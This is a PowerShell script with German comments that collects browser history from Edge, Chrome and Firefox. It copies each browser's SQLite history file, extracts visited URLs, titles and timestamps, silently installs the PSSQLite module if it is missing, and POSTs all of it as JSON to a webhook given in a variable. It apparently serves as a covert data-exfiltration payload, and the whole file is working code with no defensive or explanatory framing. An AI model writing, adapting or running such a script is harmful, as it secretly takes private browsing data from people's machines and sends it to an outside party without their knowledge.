function Get-EdgeHistory {
    $EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    $EdgeTempFile = "$env:TEMP\edge_history.sqlite"
    Copy-Item $EdgePath $EdgeTempFile -Force
    $Query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
    $EdgeHistory = Invoke-SqliteQuery -DataSource $EdgeTempFile -Query $Query
    Remove-Item $EdgeTempFile
    return $EdgeHistory
}

function Get-ChromeHistory {
    $ChromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    $ChromeTempFile = "$env:TEMP\chrome_history.sqlite"
    Copy-Item $ChromePath $ChromeTempFile -Force
    $Query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
    $ChromeHistory = Invoke-SqliteQuery -DataSource $ChromeTempFile -Query $Query
    Remove-Item $ChromeTempFile
    return $ChromeHistory
}

function Get-FirefoxHistory {
    $FirefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $ProfilePath = Get-ChildItem $FirefoxPath -Directory | Where-Object { $_.Name -like "*.default-release" } | Select-Object -First 1 -ExpandProperty FullName
    $FirefoxHistoryPath = Join-Path $ProfilePath "places.sqlite"
    $FirefoxTempFile = "$env:TEMP\firefox_history.sqlite"
    Copy-Item $FirefoxHistoryPath $FirefoxTempFile -Force
    $Query = "SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC"
    $FirefoxHistory = Invoke-SqliteQuery -DataSource $FirefoxTempFile -Query $Query
    Remove-Item $FirefoxTempFile
    return $FirefoxHistory
}

# Installieren des PSSQLite-Moduls, falls noch nicht vorhanden
if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
    Install-Module -Name PSSQLite -Force -Scope CurrentUser
}
Import-Module PSSQLite

# Browserverlauf sammeln
$AllHistory = @()
$AllHistory += Get-EdgeHistory
$AllHistory += Get-ChromeHistory
$AllHistory += Get-FirefoxHistory

# JSON-Payload erstellen
$JsonPayload = @{
    "browser_history" = $AllHistory
} | ConvertTo-Json -Depth 4

# Daten an Webhook senden
$Parameters = @{
    "Uri"         = $whuri
    "Method"      = "POST"
    "Body"        = $JsonPayload
    "ContentType" = "application/json"
}

Invoke-RestMethod @Parameters
